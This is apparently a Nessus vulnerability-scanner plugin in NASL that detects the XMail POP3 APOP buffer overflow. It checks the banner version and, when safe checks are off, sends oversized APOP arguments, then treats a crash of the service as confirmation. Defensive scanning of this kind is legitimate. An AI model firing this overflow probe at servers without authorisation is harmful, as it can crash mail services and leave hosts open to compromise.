#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(10559);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2000-0840", "CVE-2000-0841");
  script_bugtraq_id(1652);
  script_xref(name:"OSVDB", value:"458");
  script_xref(name:"OSVDB", value:"13179");

  script_name(english:"XMail APOP / USER Command Remote Overflow");
  script_summary(english:"Attempts to overflow the APOP command");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote host is running a POP server with a remote root\n",
      "vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The remote host is running XMail, a POP3 server.  The installed version\n",
      "is subject to a buffer overflow when it receives two arguments that are\n",
      "too long for the APOP command.\n",
      "\n",
      "An attacker could exploit this issue to disable the POP server or to\n",
      "execute arbitrary code as root on the remote host."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/bugtraq/2000-09/0001.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Contact the vendor for a patch."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
  );
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
  script_dependencie("popserver_detect.nasl", "qpopper.nasl");
  script_exclude_keys("pop3/false_pop3");
  script_require_ports("Services/pop3", 110);

  exit(0);
}

#
# The script code starts here
#

include('global_settings.inc');

if (report_paranoia < 1)
{
 fake = get_kb_item("pop3/false_pop3");
 if (fake) exit(0);
}

port = get_kb_item("Services/pop3");
if(!port)port = 110;
if (! get_port_state(port)) exit(0);

if(safe_checks())
{
 banner = get_kb_item(string("pop3/banner/", port));
 if(!banner)
 {
  soc = open_sock_tcp(port);
  if(!soc)exit(0); 
  banner = recv_line(socket:soc, length:4096);
 }
 
 if(!banner)exit(0);
 
 if(ereg(pattern:".*[xX]mail.*", string:banner))
 {
  if(ereg(pattern:"[^0-9]*0\.(([0-4][0-9])|(5[0-8]))[^0-9]*.*"))
  {
    notice = string(
      "*** Nessus reports this vulnerability using only\n",
      "*** information that was gathered. Use caution\n",
      "*** when testing without safe checks enabled."
    );
    security_hole(port:port, extra:notice);
  }
 }
 exit(0);
}

 soc = open_sock_tcp(port);
 if(! soc) exit(0);

  d = recv_line(socket:soc, length:1024);
  if(!d || !ereg(pattern:".*[xX]mail.*", string:d))
  {
   close(soc);
   exit(0);
  }
  c = string("APOP ", crap(2048), " ", crap(2048), "\r\n");
  send(socket:soc, data:c);
  r = recv_line(socket:soc, length:1024);

  close(soc);

for (i = 1; i <= 3; i ++)
{
  soc = open_sock_tcp(port);
  if (soc) break;
  sleep(i);
}
  if(!soc)security_hole(port);
  else {
   	r = recv_line(socket:soc, length:1024);
	if(!r)security_hole(port);
	close(soc);
	}
